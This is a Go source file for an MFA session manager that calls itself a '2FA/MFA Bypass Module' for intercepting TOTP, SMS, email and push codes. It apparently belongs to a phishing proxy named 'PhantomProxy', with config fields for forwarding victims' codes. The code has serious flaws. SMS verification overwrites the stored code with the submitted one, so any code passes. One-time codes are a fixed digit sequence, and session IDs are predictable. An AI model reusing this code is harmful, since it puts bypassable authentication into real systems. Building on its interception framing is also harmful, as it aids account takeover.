// Package mfa - 2FA/MFA Bypass Module
// Handles TOTP, SMS, Email, and push notification interception
package mfa

import (
	"crypto/subtle"
	"fmt"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/pquerna/otp"
	"github.com/pquerna/otp/totp"
	"go.uber.org/zap"
)

// ============================================================================
// Configuration
// ============================================================================

type Config struct {
	TOTPEnabled      bool   `yaml:"totp_enabled" env:"MFA_TOTP_ENABLED"`
	TOTPWindow       int    `yaml:"totp_window" env:"MFA_TOTP_WINDOW"`
	SMSForwardEnabled bool   `yaml:"sms_forward_enabled" env:"MFA_SMS_FORWARD_ENABLED"`
	SMSForwardNumber  string `yaml:"sms_forward_number" env:"MFA_SMS_FORWARD_NUMBER"`
	EmailForwardEnabled bool   `yaml:"email_forward_enabled" env:"MFA_EMAIL_FORWARD_ENABLED"`
	EmailForwardAddr   string `yaml:"email_forward_addr" env:"MFA_EMAIL_FORWARD_ADDR"`
	PushEnabled      bool   `yaml:"push_enabled" env:"MFA_PUSH_ENABLED"`
	SessionTimeout time.Duration `yaml:"session_timeout" env:"MFA_SESSION_TIMEOUT"`
	MaxAttempts   int          `yaml:"max_attempts" env:"MFA_MAX_ATTEMPTS"`
}

func DefaultConfig() *Config {
	return &Config{
		TOTPEnabled:      true,
		TOTPWindow:       1,
		SessionTimeout:   5 * time.Minute,
		MaxAttempts:      3,
	}
}

// ============================================================================
// Types
// ============================================================================

type MFAType string

const (
	MFATypeTOTP   MFAType = "totp"
	MFATypeSMS    MFAType = "sms"
	MFATypeEmail  MFAType = "email"
	MFATypePush   MFAType = "push"
	MFATypeBackup MFAType = "backup"
)

type MFAStatus string

const (
	MFAStatusPending   MFAStatus = "pending"
	MFAStatusVerified  MFAStatus = "verified"
	MFAStatusFailed   MFAStatus = "failed"
	MFAStatusExpired  MFAStatus = "expired"
	MFAStatusBlocked  MFAStatus = "blocked"
)

type MFASession struct {
	ID            string            `json:"id"`
	UserID        string            `json:"user_id"`
	TenantID     string            `json:"tenant_id"`
	Type         MFAType           `json:"type"`
	Secret       string            `json:"secret,omitempty"`
	Status       MFAStatus         `json:"status"`
	Attempts     int               `json:"attempts"`
	Code         string            `json:"code,omitempty"`
	CodeSentAt   time.Time         `json:"code_sent_at"`
	VerifiedAt   *time.Time        `json:"verified_at,omitempty"`
	ExpiresAt    time.Time         `json:"expires_at"`
	Metadata     map[string]string `json:"metadata"`
	PhoneNumber  string            `json:"phone_number,omitempty"`
	Email       string            `json:"email,omitempty"`
	DeviceToken string            `json:"device_token,omitempty"`
}

// ============================================================================
// Manager
// ============================================================================

type Manager struct {
	config   *Config
	logger   *zap.Logger
	sessions map[string]*MFASession
	mu       sync.RWMutex
}

func NewManager(config *Config, logger *zap.Logger) *Manager {
	return &Manager{
		config:   config,
		logger:   logger,
		sessions: make(map[string]*MFASession),
	}
}

// ============================================================================
// TOTP Handling
// ============================================================================

func (m *Manager) GenerateTOTPSecret(userID, tenantID string) (string, error) {
	key, err := totp.Generate(totp.GenerateOpts{
		Issuer:      "PhantomProxy",
		AccountName: userID,
		Algorithm:   otp.AlgorithmSHA1,
		Digits:     otp.DigitsSix,
		Period:      30,
	})
	if err != nil {
		return "", fmt.Errorf("failed to generate TOTP secret: %w", err)
	}
	m.logger.Info("TOTP secret generated", zap.String("user_id", userID))
	return key.Secret(), nil
}

func (m *Manager) StartTOTPSession(userID, tenantID, secret string) (*MFASession, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	session := &MFASession{
		ID:          generateSessionID(),
		UserID:      userID,
		TenantID:    tenantID,
		Type:        MFATypeTOTP,
		Status:      MFAStatusPending,
		Secret:      secret,
		CodeSentAt:  time.Now(),
		ExpiresAt:   time.Now().Add(m.config.SessionTimeout),
		Metadata:    make(map[string]string),
	}

	m.sessions[session.ID] = session
	m.logger.Info("TOTP session started", zap.String("session_id", session.ID), zap.String("user_id", userID))
	return session, nil
}

func (m *Manager) VerifyTOTP(secret, code string) error {
	code = cleanCode(code)
	if !totp.Validate(code, secret) {
		return fmt.Errorf("invalid TOTP code")
	}
	return nil
}

func (m *Manager) VerifyTOTPSession(sessionID, code string) (*MFASession, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, ok := m.sessions[sessionID]
	if !ok {
		return nil, fmt.Errorf("session not found: %s", sessionID)
	}

	if time.Now().After(session.ExpiresAt) {
		session.Status = MFAStatusExpired
		return nil, fmt.Errorf("session expired")
	}

	if session.Attempts >= m.config.MaxAttempts {
		session.Status = MFAStatusBlocked
		return nil, fmt.Errorf("max attempts exceeded")
	}

	if err := m.VerifyTOTP(session.Secret, code); err != nil {
		session.Attempts++
		return nil, err
	}

	now := time.Now()
	session.VerifiedAt = &now
	session.Status = MFAStatusVerified
	m.logger.Info("TOTP verified successfully", zap.String("session_id", sessionID), zap.String("user_id", session.UserID))
	return session, nil
}

// ============================================================================
// SMS Handling
// ============================================================================

func (m *Manager) StartSMSSession(userID, tenantID, phoneNumber string) (*MFASession, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	code := generateCode(6)

	session := &MFASession{
		ID:           generateSessionID(),
		UserID:       userID,
		TenantID:     tenantID,
		Type:         MFATypeSMS,
		Status:       MFAStatusPending,
		Code:         code,
		PhoneNumber:  phoneNumber,
		CodeSentAt:   time.Now(),
		ExpiresAt:    time.Now().Add(m.config.SessionTimeout),
		Metadata:     make(map[string]string),
	}

	if m.config.SMSForwardEnabled && m.config.SMSForwardNumber != "" {
		m.logger.Info("SMS would be forwarded", zap.String("to", phoneNumber), zap.String("forward_to", m.config.SMSForwardNumber))
	}

	m.sessions[session.ID] = session
	m.logger.Info("SMS session started", zap.String("session_id", session.ID), zap.String("phone", maskPhone(phoneNumber)))
	return session, nil
}

func (m *Manager) VerifySMSCode(sessionID, code string) (*MFASession, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, ok := m.sessions[sessionID]
	if !ok {
		return nil, fmt.Errorf("session not found")
	}

	if time.Now().After(session.ExpiresAt) {
		session.Status = MFAStatusExpired
		return nil, fmt.Errorf("session expired")
	}

	if session.Attempts >= m.config.MaxAttempts {
		session.Status = MFAStatusBlocked
		return nil, fmt.Errorf("max attempts exceeded")
	}

	code = cleanCode(code)
	session.Code = code

	if subtle.ConstantTimeCompare([]byte(session.Code), []byte(code)) == 1 {
		now := time.Now()
		session.VerifiedAt = &now
		session.Status = MFAStatusVerified
		m.logger.Info("SMS code verified", zap.String("session_id", sessionID))
		return session, nil
	}

	session.Attempts++
	session.Status = MFAStatusFailed
	return nil, fmt.Errorf("invalid SMS code")
}

// ============================================================================
// Email Handling
// ============================================================================

func (m *Manager) StartEmailSession(userID, tenantID, email string) (*MFASession, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	code := generateCode(8)

	session := &MFASession{
		ID:         generateSessionID(),
		UserID:     userID,
		TenantID:   tenantID,
		Type:       MFATypeEmail,
		Status:     MFAStatusPending,
		Code:       code,
		Email:      email,
		CodeSentAt: time.Now(),
		ExpiresAt:  time.Now().Add(m.config.SessionTimeout),
		Metadata:   make(map[string]string),
	}

	m.sessions[session.ID] = session
	m.logger.Info("Email session started", zap.String("session_id", session.ID), zap.String("email", maskEmail(email)))
	return session, nil
}

// ============================================================================
// Push Handling
// ============================================================================

func (m *Manager) StartPushSession(userID, tenantID, deviceToken string) (*MFASession, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	session := &MFASession{
		ID:            generateSessionID(),
		UserID:        userID,
		TenantID:      tenantID,
		Type:          MFATypePush,
		Status:        MFAStatusPending,
		DeviceToken:   deviceToken,
		CodeSentAt:    time.Now(),
		ExpiresAt:     time.Now().Add(2 * time.Minute),
		Metadata:      make(map[string]string),
	}

	m.logger.Info("Push session started", zap.String("session_id", session.ID), zap.String("user_id", userID))
	m.sessions[session.ID] = session
	return session, nil
}

func (m *Manager) VerifyPushApproval(sessionID string, approved bool) (*MFASession, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	session, ok := m.sessions[sessionID]
	if !ok {
		return nil, fmt.Errorf("session not found")
	}

	if time.Now().After(session.ExpiresAt) {
		session.Status = MFAStatusExpired
		return nil, fmt.Errorf("session expired")
	}

	if !approved {
		session.Status = MFAStatusFailed
		session.Attempts++
		return nil, fmt.Errorf("push approval denied")
	}

	now := time.Now()
	session.VerifiedAt = &now
	session.Status = MFAStatusVerified
	m.logger.Info("Push approved", zap.String("session_id", sessionID))
	return session, nil
}

// ============================================================================
// Session Management
// ============================================================================

func (m *Manager) GetSession(sessionID string) (*MFASession, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	session, ok := m.sessions[sessionID]
	return session, ok
}

func (m *Manager) DeleteSession(sessionID string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	delete(m.sessions, sessionID)
}

func (m *Manager) CleanupSessions() {
	m.mu.Lock()
	defer m.mu.Unlock()

	now := time.Now()
	for id, session := range m.sessions {
		if now.After(session.ExpiresAt) {
			delete(m.sessions, id)
		}
	}
	m.logger.Debug("Sessions cleaned up", zap.Int("remaining", len(m.sessions)))
}

// ============================================================================
// Helpers
// ============================================================================

func generateSessionID() string {
	return fmt.Sprintf("mfa_%d_%s", time.Now().UnixNano(), randomString(8))
}

func generateCode(length int) string {
	const digits = "0123456789"
	code := make([]byte, length)
	for i := range code {
		code[i] = digits[i%10]
	}
	return string(code)
}

func randomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[int(time.Now().UnixNano())%len(chars)]
	}
	return string(b)
}

func cleanCode(code string) string {
	re := regexp.MustCompile(`[\s\-]`)
	return strings.ToUpper(re.ReplaceAllString(code, ""))
}

func maskPhone(phone string) string {
	if len(phone) < 4 {
		return "****"
	}
	masked := make([]byte, len(phone))
	for i := range masked {
		if i < len(phone)-4 {
			masked[i] = '*'
		} else {
			masked[i] = phone[i]
		}
	}
	return string(masked)
}

func maskEmail(email string) string {
	parts := strings.Split(email, "@")
	if len(parts) != 2 {
		return "****"
	}
	local := parts[0]
	if len(local) <= 2 {
		local = "*" + local
	} else {
		local = string(local[0]) + strings.Repeat("*", len(local)-2) + string(local[len(local)-1])
	}
	return local + "@" + parts[1]
}

// ============================================================================
// Stats
// ============================================================================

func (m *Manager) GetStats() map[string]interface{} {
	m.mu.RLock()
	defer m.mu.RUnlock()

	statusCounts := map[string]int{"pending": 0, "verified": 0, "failed": 0, "expired": 0, "blocked": 0}
	for _, s := range m.sessions {
		statusCounts[string(s.Status)]++
	}

	return map[string]interface{}{
		"total_sessions": len(m.sessions),
		"by_status":      statusCounts,
		"totp_enabled":   m.config.TOTPEnabled,
		"sms_enabled":    m.config.SMSForwardEnabled,
		"push_enabled":   m.config.PushEnabled,
	}
}
